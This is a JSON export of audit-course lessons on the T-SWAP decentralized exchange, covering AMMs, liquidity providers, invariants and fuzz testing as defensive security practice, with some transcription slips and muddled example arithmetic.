functionalities. It operates exclusively on Ethereum, sans the use of oracles or zero-knowledge proofs. It does interact with ERC20 tokens though, a factor you will get a clear understanding of once we delve into the protocol explanation.\n\n## More Onboarding Questions\n\nDuring protocol onboarding, it's essential to engage in a deep and meaningful conversation with the protocol team about protocol risks. Questions about rogue protocol admin capturing fees, inflationary deflationary ERC20, fiat transfer tokens, and rebasing tokens will often receive dismissive or uninformed responses.\n\nProtocols will often deny known issues or prior audits, as seen in our onboarding document. These points, however, form a vital part of building context resources, hence their import.\n\nThe README file plays a crucial role in this process but often falls short in providing adequate information. At this point, you'd reach out to the protocol team requesting walkthroughs, explainer videos, charts, or even a blog postâ€”anything to build up an adequate information base.\n\nRemember, the developers of a protocol always possess more context than you'll ever get from code alone. Thus, asking them questions will accelerate your understanding. While it's critical to trudge through the codebase independently, reaching out when stuck can lead to faster solutions.\n\nNotwithstanding, remember to use the protocol team's time wisely and avoid asking basic questions like \"what's UN 256\". Your questions should reflect a deep understanding of the protocol and be geared towards obtaining further understanding.\n\n## Wrapping Up\n\nOur extensive onboarding not only prompts critical questions but also provides ready answers where possible. Obtaining answers to 'rec test' questions and understanding their post-deployment plans is easier when conducting a private audit. However, in a competitive audit setting, this information might not come as readily.\n\nIn summary, this T-SWAP audit tutorial shows just how comprehensive and detailed a security review can be. From cloning repositories and capturing enormous amounts of data to conversing with the protocol team about potential risksâ€”every stage carries its weight of importance. So, buckle up, ask questions, and dig into those reviews with gusto!\n\nKeep an eye on this space, and let's explore more interesting protocols next time.\n",
          "updates": []
        },
        {
          "lessonId": "cc17642d-b651-4008-9c54-9c65032f9a91",
          "number": 3,
          "title": "Primer On This Review",
          "slug": "primer-on-this-review",
          "folderName": "3-primer-on-this-review",
          "description": "",
          "duration": 2,
          "videoUrl": "rzFEOWoy8eg9xa00fEWpB269vMtyoClvuA6J597rvY00k",
          "rawMarkdownUrl": "/routes/security/5-tswap/3-primer-on-this-review/+page.md",
          "markdownContent": "---\ntitle: Primer on This Specific Review\n---\n\n_Follow along with this video:_\n\n\n\n---\n\nWelcome, committed developers! If you've successfully traversed the onboarding phase of your latest project, not without its fair share of glitches, but overall a positive experience, let's now sail into the realms of uncharted territory. Here's where we dig deeper into documentation and imbibe the magic potion of protocol invariants. Sound unfathomable? Stay hooked!\n\n_\"Understanding a protocol's invariants is as crucial as security review itself, and it's possible to do one without opening any code.\"_\n\nSo buckle up for an intriguing journey of dissecting documentation, decoding protocol invariants, and their role in devising robust test suites.\n\n## **Unveiling Documentation**\n\nDocumentation serves as a treasure trove of virtues to get a deeper understanding of the codebase. Let's take a tour of the pertinent areas that call for focus and elaboration. Crystal clear documentation eases the complex process of security review, butâ€”to our dismayâ€”that's not always the case.\n\nAt times, documentation may not do absolute justice in illustrating intricate processes or mechanisms. For these instances, we need to bolster comprehension using self-explanatory diagrams and choreographed video lessons.\n\n## **Impact of Base Protocols: Case of Uniswap**\n\nOur discussion takes a fascinating turn as we move onto the trading phenomenon of decentralized exchanges. The protocol under our scanner, TSwap, derives its inspiration from the Uniswap Protocol.\n\n![](https://cdn.videotap.com/40hr7aunyYjpIPhaqrYe-49.68.png)\n\n[Learn more about Uniswap here](https://docs.uniswap.org/)\n\nBy analyzing TSwap, you inadvertently learn a great deal about Uniswap. It will unveil underlying concepts such as Automated Market Makers (AMMs) and decentralized exchanges.\n\nThe significance of comprehending these principles becomes the focal point when conducting a _Decentralized Finance (DeFi) Security Review_. The term \"Raffle,\" if familiar, would sound synonymous in this context. The rule of thumb? Know about raffles if dealing with a raffle, understand decentralized exchange when handling a decentralized exchange!\n\n## **Exploring Protocol Invariants**\n\nNow, before plunging into the nitty-gritty of devising foolproof test suites, let's lay the groundwork and comprehend _protocol invariants_.\n\nProtocol invariants typically refer to properties in a system that remain unchanged irrespective of the sequence of operations. Essentially, during the security review of a codebase, it's vital to define and verify the protocol invariants.\n\n## **Testing the Waters: Prepping for Test Suites**\n\nIn the world of coding, defining and understanding protocol invariants occupies a paramount position before the creation of test suites. It devolves chaos into order, aligns our vision, and sets into motion a trajectory that ultimately leads us to the wonderland of our retrieved goal.\n\nTo sum up, navigating the labyrinth of code security review gets simpler if you devote sufficient time understanding the nuances of documentation, the influence of base protocols and the pivotal role of protocol invariants before crafting test suites.\n\nIn the words of a seasoned developer,\n\n> \"Understanding the precepts before jumping into action can make the journey less cumbersome and the destination more rewarding.\"\n\nSo let's make that journey, let's begin the rewarding read and understanding the documentation.\n",
          "updates": []
        },
        {
          "lessonId": "50ec6e20-7dd2-4a15-954f-67be45ea239d",
          "number": 4,
          "title": "What is a DEX?",
          "slug": "what-is-a-dex",
          "folderName": "4-what-is-a-dex",
          "description": "",
          "duration": 3,
          "videoUrl": "tYZiE4cU00JTzVmBoQ02bvni00M4S5onYqGkTQLTLHOraA",
          "rawMarkdownUrl": "/routes/security/5-tswap/4-what-is-a-dex/+page.md",
          "markdownContent": "---\ntitle: What is a DEX?\n---\n\n_Follow along with this video:_\n\n\n\n---\n\n# The Ultimate Guide To T-SWAP &amp; Decentralized Exchanges\n\n## Getting Started\n\nAre you familiar with the concept of decentralized exchanges or DEXes? Well, T-SWAP is a promising project and an upcoming player in this space. T-SWAP is meant to be a permissionless way for users to swap assets between each other at a fair price. What else does T-SWAP aim to do, you ask? Well, let's unravel its offerings.\n\n## The T-SWAP in a Nutshell\n\nImagine you're a user with ten USDC (a stablecoin pegged to the US dollar) and you want to buy WETH (Wrapped Ether, an ERC20 equivalent of Ethereum). T-SWAP essentially allows for this transaction to occur. In simple terms, a user starts with ten USDC and zero WETH, use T-SWAP to make a swap, and they will end with zero USDC and some WETH.\n\nYou can think of T-SWAP as a decentralized asset token exchange similar to popular platforms such as Coinbase or Robinhood. But it's not just another cryptocurrency exchange, it is powered by the concept of decentralization, offering a cutting-edge alternative to traditional exchanges.\n\n![](https://cdn.videotap.com/iTNZThQG62yyusiLZJVT-35.77.png)\n\n## Diving into Decentralized Exchanges (DEXes)\n\nA quick visit to DeFi llama, a popular site that tracks decentralized finance protocols, will give you an idea about the variety of DEXes in the market. From Uniswap, Curve, Balancer to SushiSwap, each of these platforms have unique code bases and different pros and cons.\n\n> \"DEXes are a revolutionary approach to asset exchange, veering from the centralised norm and offering an autonomous, often peer-to-peer, trading experience.\"\n\nT-SWAP, much like many of these exchanges, is also classified as an Automated Market Maker (AMM). If you are confused or intrigued at this point, don't sweat it. Here is an article on Chainlink Labs that provides a detailed walk-through of the AMM concept.\n\n## Introducing Automated Market Makers (AMM)\n\nDecentralized exchanges such as T-SWAP operate differently from traditional order book exchanges. This is where the concept of AMMs comes in. It makes use of asset pools rather than an order book for asset exchange.\n\nRemember, diving into the world of DEXes and AMMs can initially be challenging, but also immensely rewarding. So take the plunge, and happy learning!\n",
          "updates": []
        },
        {
          "lessonId": "dea61563-14e6-4c88-935e-4cbdc977f46a",
          "number": 5,
          "title": "What is an AMM?",
          "slug": "what-is-amm",
          "folderName": "5-what-is-amm",
          "description": "",
          "duration": 10,
          "videoUrl": "hcaTWeWr7FV6DhzTW35q6500rQOmqIeA2RPaSVvjiWvw",
          "rawMarkdownUrl": "/routes/security/5-tswap/5-what-is-amm/+page.md",
          "markdownContent": "---\ntitle: What is an AMM & How AMM works?\n---\n\n_Follow along with this video:_\n\n\n\n---\n\n# Understanding Automated Market Makers: A Deep Dive into Decentralized Finance\n\nDecentralized finance is gaining popularity as the world turns towards blockchain technologies for secure, transparent financial transactions. Central to DeFi's attraction is the Automated Market Maker (AMM), a unique trading model that is reshaping our understanding of trading mechanisms. However, to grasp this concept effectively, let's first refresh our understanding of the traditional order book style of exchange.\n\n## The Traditional Order Book Style of Exchange\n\nImagine that you want to trade on Coinbase or Robinhood. Here's what that process might look like:\n\n1. You come to the exchange and say, \"Hey, I want one WETH (Wrapped Ethereum) for ten USDC.â€\n2. You place an order that goes onto what's known as an 'order book.'\n3. Another user sees your trade and decides they're interested.\n\nIf the other user has one WETH and zero USDC, they might think your trade is reasonable and decide to take it. The system identifies these matched orders and facilitates the exchange. User A gives ten USDC to the system, which gives it to User B, and vice versa.\n\nThis model is commonly used by large, centralized exchanges; however, it does present a few challenges:\n\n- Every exchange transaction using Ethereum costs 'gas' (i.e., the cost of computation). This can rack up significant costs for users and could potentially deter people from using the platform.\n- With this style of exchange, a lot of computation work occurs behind the scenes. This complexity can hinder its full implementation on a decentralized platform like Ethereum.\n\nSo, knowing these limitations, Ethereum decided on an alternate approach.\n\n![](https://cdn.videotap.com/e4EULmEIKYejqgjYxvO4-189.76.png)\n\n## Enter the Automated Market Maker\n\nRather than placing orders and matching them as in an order book exchange, an AMM operates on the principle of liquidity pools.\n\nLet's visualize this using an example:\n\n1. Assume two giant pools of money or 'liquidity pools' exist â€” one with 100 WETH and the other with 1000 USDC.\n2. User A wishes to buy one WETH with his ten USDC.\n\nAt this stage, a specific mathematical function comes into play:\n\n- The system calculates the ratio of WETH to USDC in the pools which is 1000 USDC / 100 WETH = 10.\n- So, the 'mock price,' as we are calling it, is 1 WETH = 10 USDC.\n\nNow, if User A wants to take one WETH out of the pool, he must ensure the correct ratio is maintained. So he puts ten USDC into the USDC pool, and only then can he take out one WETH.\n\n![](https://cdn.videotap.com/NDFbEb030FC4DlLUCFdR-355.8.png)\n\nThis alters the ratio in the pools. There are now 1010 USDC and 99 WETH. Recalculating, we see the ratio is now 1010/99 = 10.2. One WETH now amounts to 10.2 USDC - an increase of 0.2 USDC from the last transaction. By simply completing the transaction, User A has managed to move the market and change the price of WETH. This essentially resembles market dynamics breath the concept of supply and demand; as demand for an asset increases, so does its price, and vice versa.\n\n![](https://cdn.videotap.com/csLNwV1pl8cFQGODANry-379.52.png)\n\nThis same principle applies when User B wants to trade. They can keep changing the ratios by adding or subtracting amounts in these pools to trade their preferred amount, given that the ratio always is maintained. This AMM model is known as a 'constant product market maker,' a type of AMM that maintains a constant product of the quantities of the two assets.\n\nThe following code block presents an example of how this might be implemented programmatically:\n\nThis demonstrates how an AMM operates in a simple and efficient manner, bypassing the traditional challenges of an order book model. But, it is important to remember that this simple example doesn't capture the complexity and potential risks associated with real-world AMMs.\n\nAMMs are just one aspect of DeFi that is pushing the boundaries of what is possible in finance, allowing individuals to gain control over their financial interactions. However, itâ€™s crucial to understand that, like any financial system, it comes with its own set of risks and challenges. Remember, your capital is always at risk when investing.\n\n_â€œThe fascination of DeFi lies in the infinite possibilities it brings to the world of finance, pushing boundaries and creating opportunities.â€_\n",
          "updates": []
        },
        {
          "lessonId": "08b67262-6849-4a51-b128-5a890f5b25a5",
          "number": 6,
          "title": "Liquidity Providers",
          "slug": "liquidity-providers",
          "folderName": "6-liquidity-providers",
          "description": "",
          "duration": 11,
          "videoUrl": "omJrL01ykVB5zgQ5UYnNeZBtMWtHpHuB2TonfBkOZmN4",
          "rawMarkdownUrl": "/routes/security/5-tswap/6-liquidity-providers/+page.md",
          "markdownContent": "---\ntitle: Liquidity Providers - Why AMMs have Fees?\n---\n\n\n\n---\n\n# Untangling Decentralized Finance: Understanding Automated Market Makers (AMMs)\n\nWelcome back to our deep-dive into the bustling world of decentralized finance. Today, we're unraveling the complexity of Automated Market Makers (AMMs) like Uniswap and Sushiswap, explaining how they facilitate trades and generate fees for liquidity providers. Let's get started!\n\n## What Makes An AMM Work?\n\nThe heart of an AMM like Uniswap resides in its liquidity pools. For simplicity, let's take an imaginary pool that contains 1000 USDC (United States Digital Coin) and 100 WETH (Wrapped Ether). This pool facilitates trades: for instance, someone could exchange 10 USDC for 1 WETH.\n\nBut there's more to it: after the trade, there's a new balance in the pool. With one WETH taken out and 10 USDC added, we now have 1010 USDC and 99 WETH.\n\nIMPORTANT: Remember, almost all AMMs also extract a small fee for each transaction, say, 0.3%. So, to trade 1 WETH, one might actually need to send 1.03 WETH, with the 0.03 WETH fee either going to its designated spot or staying within the pool.\n\nNow, you might be wondering if there's a loophole that allows you to make infinite money by continuously trading, but allow us to dash your dreams. AMMs have mathematical safeguards in place to prevent such abuse.\n\n## The Role Of Liquidity Providers\n\nWho funds these pools full of digital currencies, you ask? Enter the Liquidity Providers (LPs), the unsung heroes of the AMM system. They supply the assets to the protocol so individuals can perform swaps.\n\nWhen an LP adds their funds - for example, 1000 USDC and 100 WETH - they gain ownership of the pool equivalent to their share of total funds, which is represented by Liquidity Provider Tokens (LP Tokens).\n\nSo, by investing their assets into the protocol, LPs not only gain ownership but also earn a share of the transaction fees generated from the trades.\n\n## More About LP Tokens And Fees\n\nLet's investigate further into the LP Tokens and their relationship with fees. Say, a new liquidity provider, C, enters the pool with half of what A and B initially put in, essentially 500 USDC and 50 WETH. This, in turn, increases the total assets in the pool to 2500 USDC and 250 WETH.\n\nIn return for their contribution, liquidity provider C receives LP tokens. How many?\n\nWell, we can calculate that by taking the ratio of the funds they've added to the total funds, in this case, 0.2 (or 20%). Multiplying this by the total LP Tokens, we deduce that liquidity provider C will receive 50 LP Tokens, granted their contribution.\n\nConsequently, we now have a total of 250 LP Tokens in circulation. At this juncture, we also have a pool of 2500 USDC and 250 WETH ready for trades.\n\n## How Fees Make Money For Liquidity Providers\n\nThe burning question now is: How do liquidity providers make profits? The answer lies with the transaction fees mentioned earlier.\n\nEvery trade results in a fee that slightly adjusts the ratio of assets in the pool. For instance, if a user trades 10 USDC for 1 WETH, they're also charged a fee (0.3 USDC in our example), which changes the pool balances to 2510.3 USDC and 249 WETH.\n\nWhen a liquidity provider chooses to withdraw their funds, they can redeem their LP tokens for an amount of each pool asset proportional to their LP tokens. So, if Liquidity Provider C withdraws their 50 LP Tokens (representing a 20% stake), they'll get back their original investment plus their earned fees.\n\nLet's crunch some numbers:\n\n```markdown\n# Assuming 1 WETH is equivalent to 10 USDC\n\n# Initial Deposit: 500 USDC and 50 WETH\n\n# Amount Withdrawn: 502.6 USDC and 49.8 WETH\n\n# Equivalent to: 498 USDC + 502.6 USDC = 1000.6 USDC\n\n# Profit: 1000.6 USDC - 1000 USDC = 0.6 USDC\n```\n\nIt's by these accruing transaction fees that liquidity providers gain returns on their investments. The more trades executed, the more fees generated and the more money they make, providing an explanation regarding why so many are lured towards becoming liquidity providers.\n\n## Wrapping Up\n\nAt a high level, this is the underlying mechanism of an automated market maker like Uniswap. It might seem complex or counterintuitive at first, especially given the novel concepts and the involvement of mathematical models. But with some involvement and time, I assure you, it all starts making more intrinsic sense.\n\nIn the end, it's about providing liquidity, facilitating exchanges, and earning fees - all in a decentralized manner on the blockchain.\n\n> \"Decentralized finance might seem mesmerising at first, but when you dive into it, you realize it's all about providing liquidity, facilitating exchanges, and earning rewards â€“ all in a decentralized way on the blockchain.\"\n\nStay tuned for more deep-dives into the ever-evolving world of decentralized finance!\n",
          "updates": []
        },
        {
          "lessonId": "3a439ac2-6269-4ca3-9152-8fc65b99a683",
          "number": 7,
          "title": "How AMMs Work",
          "slug": "how-amms-work",
          "folderName": "7-how-amms-work",
          "description": "",
          "duration": 5,
          "videoUrl": "zJAJSEA014rfj6VNwcIbCRic01jhR8bDsVk4wCZ3vvBjA",
          "rawMarkdownUrl": "/routes/security/5-tswap/7-how-amms-work/+page.md",
          "markdownContent": "---\ntitle: How AMMs Work Recap\n---\n\n\n\n---\n\n# Understanding Automated Market Makers, T-SWAP and Uniswap\n\nCramming a ton of concepts into one learning session can be overwhelming. But let's decode the concepts of T-SWAP or Uniswap, and how Automated Market Makers (AMMs) operate and differ from traditional order books.\n\n## Reviewing Traditional Order Books\n\nIn typical exchanges, a user may propose a trade, for instance, as wanting 1 ETH for 10 USDC. This proposal gets placed into an order book. Users are then able to propose their own trades or to accept others' proposals. This method is how a traditional centralized exchange operates, using the order book methodology.\n\nHere's a basic example:\n\n> \\[ User1: TRADE PROPOSAL â€” 1 ETH for 10 USDC \\]\n\nHowever, a lot happens behind the scenes in this model. Orders are being matched, and with an extensive list of orders in their order books, this process can be highly gas-consuming, involving multiple transactions on the centralized exchange.\n\n**IMAGES HERE**\n\nThe challenge with decentralized finance (DeFi) is this model's costs. If many transactions lead to significant gas spending and if you have to wait for someone to accept your trade, it could take quite a few blocks. So, the question is â€” how can we manage costs and keep trading to one transaction?\n\n## Introducing Automated Market Makers (AMMs)\n\nEnter AMMs, a solution to the above problems. Instead of an order book, we work with giant pools of money and utilize the ratio between these pools as the assets' price. To take money out of one pile, you need to put equivalent ratio into the other pile. This concept is known as the AMM, more specifically, the constant product market maker or constant product formula.\n\nAlso, each swap that users make on their smart contract collects an added fee. These fees incentive people to create and contribute to these money pools as liquidity providers actually make profit from these accumulated fees with more trades people make.\n\n## Understanding T-swap and Uniswap\n\nBoth [Uniswap](https://uniswap.org/) and T-swap use the AMM model. Uniswap, for instance, has gone through several iterations (v1, v2, v3 with v4 currently in progress), each slightly different but fundamentally based on the AMM's principles.\n\nWhen learning a protocol, consider taking a hands-on approach. Connect to the protocol through a secure wallet and test out transactions.\n\n> **NOTE:** The 'Discussions' tab, Piranha IO, the Ethereum Stack Exchange, Discord, and Telegram are invaluable resources for understanding novel solutions that developers and protocol creators are cooking up. Get comfortable asking questions, especially when conducting a private audit.\n\nWith time, the process becomes more navigable, allowing you to understand the protocols and begin tinkering with the code.\n\n## Building Context and Better Understanding AMMs\n\nLet's explore further. If unclear, don't sweat it. It's okay to not get everything right away â€” continue to ask questions and gradually everything will fall into place.\n\nBrowse through the Git repo associated with the current section, go to the audit data branch, and take a good look at the accompanying diagrams. They will offer a good visual understanding of how these concepts interlock.\n\nTo better understand AMMs and keep up with the evolving world of DeFi, keep probing, keep asking questions, keep building context. No one method is a silver bullet â€” the best way to learn is the way that works for you.\n\n> \"The more you work with it, the more sense it'll make.\"\n",
          "updates": []
        },
        {
          "lessonId": "82992418-cc58-44f2-834d-3a3450284f54",
          "number": 8,
          "title": "TSwap Recon Continued",
          "slug": "t-swap-recon-continued",
          "folderName": "8-t-swap-recon-continued",
          "description": "",
          "duration": 3,
          "videoUrl": "knE1hhvNNInu6UDaUpUcB009IRMz801so7fgDECNZuq1U",
          "rawMarkdownUrl": "/routes/security/5-tswap/8-t-swap-recon-continued/+page.md",
          "markdownContent": "---\ntitle: T-SWAP Recon Continued\n---\n\n\n\n---\n\n# Decoding the AMM Swapping Process using Pool Factory Contracts\n\nIn our last conversation, we delved into the complexities of the AMM (Automated Market Maker) swapping process. This blog post builds on that foundation, unravelling other critical sections and explaining how a pool factory contract fits into the picture.\n\n![](https://cdn.videotap.com/KhZyFmTzPcrusQqCBOsj-8.05.png)\n\n## Diving into a Pool Factory Contract\n\nAt its core, the protocol begins as a pool factory contract, which you can use to create new pools of tokens. Glancing through the audit data branch, you'll notice the `poolfactory.sol` that includes this `Create Pool` function. This function is responsible for forming these AMM pools, hallmarking a major component of our swapping process.\n\n```js\nfunction createPool(address tokenA, address tokenB) external returns (address pool) {\n    // ...\n    return pool;\n}\n```\n\nMade it more evident, when we zoom into the `poolfactory.sol`, it's seen that various token pairs can be created. For instance, there's a USDC WETH pool being created with the `Create Pool` function. Yes! You just don't create pools; it's also about combining different token pairs to form these pools.\n\n## Understanding the Logic behind Pool Contract\n\nThe contract used to create new pools ensures that each pool token adheres to the correct logic. Nonetheless, the real allure of these pool contracts comes alive with each T swap pool contract.\n\nTo highlight this point, I navigated the SRC, where I found the `create pool` function in play (highlighted in the `poolfactory.sol`). This function sprung my curiosity, and I began exploring it more.\n\nTo my delight, I discovered that the function seemingly calls this new TSWAP pool function. Though information-dense, the sequence makes sense as the `Create Pool` function is being called to create a new pool contract.\n\nAfter investing some time into exploring the process, I realized that each TSWAP contract operates as an exclusive exchange between two specific assets, as originally depicted in our early diagram with ne ERC 20 and the WETH token.\n\n## Bridging the Gap via Pools and WETH\n\nThe magic of WETH lies in its ability to specifically provide pools with the power to allow users to freely swap between an ERC 20 having a pool and WETH (Wrapped Ether). With a sufficient number of pools created, they enable an easy hop between supportive ERC 20s.\n\nIf this sounds like a challenge, consider this; if I possess USDC, I could swap from USDC to WETH. Then, switching from WETH to Link becomes feasible because there's likely going to be a USDC WETH pool and a Link WETH pool.\n\nNow, letâ€™s explain the process with an easy example,\n\n> User A has ten USDC. They want to swap it for die. So, they swap their ten USDC for WETH in the USDC WETH pool. They then swap their WETH for die in the Dai WETH pool.\n\nIt falls into place now, doesn't it? Every pool designates a unique pair between some tokens and WETH. Not only does it provide functionality for swapping but also gives developers insight into the two functions enabling the swap process.\n\nAt the higher level, this is how swapping works, and playing around with the sample codes will only enrich your understanding of the process.\n\n## Role of Liquidity Providers\n\nHopefully, this article provided you with useful insights into the process of pool creation, swapping, and the essence of LPs. However, there's much more to explore and understand, and it's fascinating to see how these different components intricately work together to enable seamless AMMs.\n",
          "updates": []
        },
        {
          "lessonId": "7e94a8f8-45d8-4500-a442-c6405637fc5c",
          "number": 9,
          "title": "Invariant & Properties Introduction",
          "slug": "invariant-&-properties-introduction",
          "folderName": "9-invariant-&-properties-introduction",
          "description": "",
          "duration": 3,
          "videoUrl": "IDlcJVI801yE5cL00TjoLILVMQ6N02pSVHht8c4HyzMbN4",
          "rawMarkdownUrl": "/routes/security/5-tswap/9-invariant-&-properties-introduction/+page.md",
          "markdownContent": "---\ntitle: Invariant & Properties Introduction\n---\n\n\n\n---\n\n# Demystifying Core Invariants in Blockchain Protocols\n\nDiving deep into the world of Blockchain, I thought to explore something fundamental yet intriguing: the concept of **invariants**. Invariants form the bedrock of most blockchain protocols, a feature you will encounter in almost every protocol ranging from ERC 20s to ERC 721s. Understanding this critical element is vital for anyone looking into the inner workings of these protocols.\n\nIn this blog, we'll cover invariants thoroughly while also touching on how to inspect them properly. We'll hope to do so by investigating the TSWAP protocol and its core invariant. Create a hot beverage, loosen up, and letâ€™s probe these invariants together!\n\n## What are Protocol Invariants?\n\nInvariants, in blockchain terms, are properties or conditions within a system that remain unaltered regardless of the actions carried out within the system. They are dynamic rules ensuring the system's safety, and they play a pivotal role in designing tokens in blockchain protocols.\n\nFor instance, various types of tokens like ERC 20, ERC 721, or ERC 626 have numerous invariants to their names. Each ERC 20 has 20 properties or invariants while an ERC 721 has 19. As you'll discover later in this course, ERC 626 tokens, which we'll cover in the _Vault Guardians_ section, boast of whopping 37 properties.\n\nTo get a hang of these properties, you can pay a visit [here](https://blog.trailofbits.com/2023/10/05/introducing-invariant-development-as-a-service/), at the _Trail of Bits repository_. This repository neatly lays out the invariants of an array of tokens.\n\n## TSWAP Protocol and Invariants\n\nNow, let's turn our gaze towards the TSWAP protocol. If you explore the protocol, you'll encounter the gift the developers have graciously provided: the core invariant.\n\nHowever, it's noteworthy to understand that sometimes developers may not correctly establish the invariant. In such cases, the onus falls on us, the _Security Experts_, to ensure accuracy. While the developers hand you the necessary details, understanding and breaking down the invariants becomes a task of paramount importance.\n\nUnfortunately, many developers do not fully grasp their own created invariants. Bearing this in mind, you might come across instances where you need to discern the invariants by referring to the documentation. Therefore, it's crucial for every developer to understand invariants better or properties.\n\n## Invariants and Fuzz Testing\n\nAs we've already laid some groundwork on invariants, let's now head towards a deeper understanding of them by considering fuzz testing.\n\n> â€œFuzz testing or fuzzing is a method for discovering coding errors and security loopholes in software, networks, or operating systems by inputting massive amounts of random data to the system in an attempt to make it crash.â€\n\nI've brought together a series of fuzz testing videos which we will delve into dipping our toes into the in-depth understanding of invariants and fuzzing.\n\nBut before that, if you are an alumnus of the **Foundry Course**, you may already have a basic understanding of fuzzing. Nevertheless, a refresher would surely help as we dig deeper into the concept with a more in-depth pedagogical approach.\n\nIn the next phase, we will examine a quick informative video to enhance our understanding of invariants and the varied tactics to evaluate them, with a specific focus on fuzz testing.\n\nBuckle up, recalibrate your focus, and letâ€™s take this enlightening journey on understanding the invariances better. After all, there's no better time to learn something new than right now. Stay curious!\n",
          "updates": []
        },
        {
          "lessonId": "cfdd384a-8605-435d-a4e6-54a8423bfef7",
          "number": 10,
          "title": "Stateful And Stateless Fuzzing",
          "slug": "stateful-and-stateless-fuzzing",
          "folderName": "10-stateful-and-stateless-fuzzing",
          "description": "",
          "duration": 10,
          "videoUrl": "xQx6cWAYc7smFlIS800iYrTKmzFNeI0252UZoX8usT2tY",
          "rawMarkdownUrl": "/routes/security/5-tswap/10-stateful-and-stateless-fuzzing/+page.md",
          "markdownContent": "---\ntitle: Stateful and Stateless Fuzzing to Test Invariants\n---\n\n\n\n---\n\n# Mastering Fuzz Testing to Secure Your Code\n\nAh, contracts written, tests conducted â€” time to ship your code, right?\n\nWrong.\n\n![](https://cdn.videotap.com/tSLOq12UEqMlEKM1ZYUu-34.65.png)\n\nThe answer is a straightforward no, as your code can easily fall prey to a flash loan attack. This post will guide you through the complex but fascinating world of Fuzz Testing and how it can help you safeguard your code from unexpected exploits.\n\n## The Notorious Flash Loan Attack\n\nIn essence, a flash loan attack could jeopardize your whole system, regardless of how well you've written or tested your code. As intriguing as it may sound, this breach results from already prepared and unthought-of scenarios that lack appropriate tests.\n\n> \"Most of the time, hacks will come from a scenario that you didn't think about or write a test for.\"\n\n## Enter: Fuzz Testing\n\nFuzz testing (also known as fuzzing) is a robust fix to cope with these random yet deadly exploits. It involves supplying random data to your system with an aim to break it â€” just like relentlessly trying to pop a balloon until it finally gives in, serving as a metaphor for our system code here.\n\nSounds a bit odd, huh? Why would we want to break our own system?\n\n![](https://cdn.videotap.com/EkFB4lChiHAsfS8axMsP-150.16.png)\n\nGlad you asked. Here's where the concept of invariants or properties of a system come into play. These are the untouchable rules or the inviolable conditions in our system that should always hold true. For instance, in a function that mandates our variable outcome to always be zero, this condition would be our invariant.\n\n## Testing: Unit Test vs. Fuzz Test\n\nConsider our function called `doStuff` which accepts an integer as an input parameter and promises to always return zero.\n\nThis code passes a single data point, calls the function and then asserts that the variable `shouldAlwaysBeZero` is indeed zero. With such a test, our function seems to be covered for the given data input.\n\n### - Fuzz Test:\n\nHowever, what if the data input is different? What if itâ€™s two, causing `shouldAlwaysBeZero` to become one and thereby breaking our invariant?\n\nIn this Fuzz test, we replace the manually selected data in the original unit test parameter with randomized data (commenting out the previous line of code). When you run a test here, the program will automatically randomize the data, resulting in different examples.\n\nRunning the aforementioned unit test will pass, but running the equivalent Fuzz test will actually highlight where our system fails. It'll show an output where it says \"assertion violated\" and provide the data and arguments that caused the fail, all by randomly throwing data at our function.\n\nThat said, it's important to understand that Fuzzers wonâ€™t cover every single possible input, hence, understanding how your Fuzzers pick the random data is a crucial skill to develop.\n\n## Moving on to Stateful Fuzzing\n\nA Fuzz test is usually a stateless fuzz test, meaning the state of the previous run is discarded for the next run. However, in some cases like our example, we need the outcome of the previous run to influence the next one. For this, we bring in Stateful Fuzzing.\n\nStateful Fuzzing is where the ending state of our previous fuzz run is the starting state of the next fuzz run. For example, instead of creating a new instance of our contract for each test run, we use the same contract and perform multiple operations on it.\n\nWe can use Foundry's invariant keyword to perform stateful fuzzing, but first, we need to import the `STD invariant` contract, let Foundry know which contract to call random functions on, and then, write our invariant.\n\nUpon running this test, we will finally discover a sequence where our assertion fails, providing us with the information to adjust our code accordingly.\n\nWhile fuzzing with Foundry, an important distinction to keep in mind is between fuzzing or stateless fuzzing and invariants or stateful fuzzing.\n\n## Embedding Fuzz Testing into Your Routine\n\nIn a real-world setting, your invariant might not be as simple as our example. It could look something like ensuring new tokens minted are less than the inflation rate or creating a lottery game where there should only be one winner. Although fuzz testing isn't a substitute for expert manual review, it is certainly a critical tool to thwart vulnerabilities in your code.\n\nFinally, we hope you've gained a solid knowledge of the basics of fuzz testing. Fear not, you're not alone in your journey. At [cyfrin](https://www.cyfrin.io/), we use invariants during our audits to identify vulnerabilities that are frequently difficult to catch purely with manual reviews.\n\nStay tuned for our next post where we'll delve into the advanced fuzzing techniques and help you become a fuzzing pro. Together, let's strive to make Web 3.0 even better! Happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "453797a9-269f-4b55-a04d-42e759298e40",
          "number": 11,
          "title": "Stateless And Stateful Fuzzing Practice",
          "slug": "stateless-and-stateful-fuzzing-practice",
          "folderName": "11-stateless-and-stateful-fuzzing-practice",
          "description": "",
          "duration": 5,
          "videoUrl": "WFMFpiMv02tkF01CdWAlHn01gtmJ101oQmD9MLr003LxkC68",
          "rawMarkdownUrl": "/routes/security/5-tswap/11-stateless-and-stateful-fuzzing-practice/+page.md",
          "markdownContent": "---\ntitle: Stateless and Stateful Fuzzing Practice Introduction\n---\n\n\n\n---\n\n# Proficiency in Invariant Tests and Fuzzing Tests: Professional Insights and Practicum\n\nHello everyone, today we delve deeper into the intriguing world of invariant tests and fuzzing tests. Buckle up as we gear up to break some contracts by exploring these tests, intentionally leaving the code unexamined for now. Our curiosity piqued? Letâ€™s get into it!\n\n## Diving into Code Bases\n\nWe canâ€™t help but sneak a peek into the code now, can we? Since we are here, let's analyze this exemplary TSWAP pool code base.\n\n![](https://cdn.videotap.com/9DXkrFHNdYGt3CJIJuAh-39.png)\n\nIt's filled with a plethora of comments, functions, and other intricate elements - it's enough to make the most seasoned of us a tad bit overwhelmed. Amongst us is the pool factory that stands minimal. We notice that the primary responsibility of pool factory is to create pool functions. Isnâ€™t it interesting to note the stark contrast between TWSAP pool code base and pool factory?\n\n## What About the Security Review Test?\n\nGood question! Weâ€™ll get there, but remember, we are just humans, and the chance for errors and omissions is high. We might fail to spot certain defects during the manual review of the security test. This is precisely why leveraging automated tools as much as possible for these reviews is essential. Trust me, the experiences we collect from the practice of working with these tools are going to be invaluable.\n\n## Plunge into Fuzzing: Stateless and Stateful\n\nIn this chapter, we will focus on working with **stateless** and **stateful** fuzzing along with some advanced strategies. These techniques have personally worked wonders for me in competitive audits. My method has been to comprehend a protocol's invariant without really examining the code base, write an invariant test suite, and voila â€“ bugs are unveiled effortlessly.\n\nThere are also other fuzzers to explore. Take the [Echidna Fuzzer](https://github.com/crytic/echidna) by the Trail of Bits team, for instance. Famed for being a 